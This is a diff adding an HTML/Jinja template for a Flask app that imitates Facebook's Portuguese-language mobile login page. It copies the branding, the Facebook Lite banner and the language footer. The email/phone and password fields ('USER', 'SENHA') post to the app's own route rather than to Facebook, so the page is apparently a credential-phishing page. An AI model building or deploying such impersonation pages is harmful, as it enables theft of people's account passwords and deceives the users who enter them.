@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <link rel= "stylesheet" type= "text/css" href= "{{ url_for('static',filename='style.css') }}">
+        <link rel="icon" href="{{url_for('static',filename='img/logo.png')}}">
+        <meta name="viewport" content="width=320">
+        <title>Facebook</title>
+        
+    </head>
+    <body>
+        <div class="bgpopup">
+            <img class="phone" src="{{url_for('static',filename='img/phone.png')}}"> 
+            <p class="popup">Obtenha o Facebook Lite e navegue mais rápido</p>
+        </div>
+        <form method="post" action="{{url_for('index')}}" >
+            <img src="{{url_for('static',filename='img/title.jpg')}}">
+            <input type="text" placeholder="Número de celular ou email" class="email" name="USER" required="">
+            
+            <br>
+            
+            <input type="password" placeholder="Senha" class="senha" name="SENHA">
+            
+            <br>
+            
+            <strong><input type="submit" value="Entrar" href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr" class="open"></strong><br>
+            <a>Esqueceu a senha?</a>
+            <div class="divisor1"></div><p>ou</p><div class="divisor2"></div>
+            <input type="submit" value="Criar nova conta" class="new">
+        </form>
+
+    </body>
+    <footer>
+        <div class="langs1">
+            <a class="br">Português (Brasil)</a><br>
+            <a class="lang">Español</a><br>
+            <a class="lang">Deutsch</a>
+        </div>
+        <div class="langs2">
+            <a class="lang">English (US)</a><br>
+            <a class="lang">Français (France)</a><br>
+            <a class="lang">Italiano</a>
+        </div>
+        
+    </footer>
+</html>
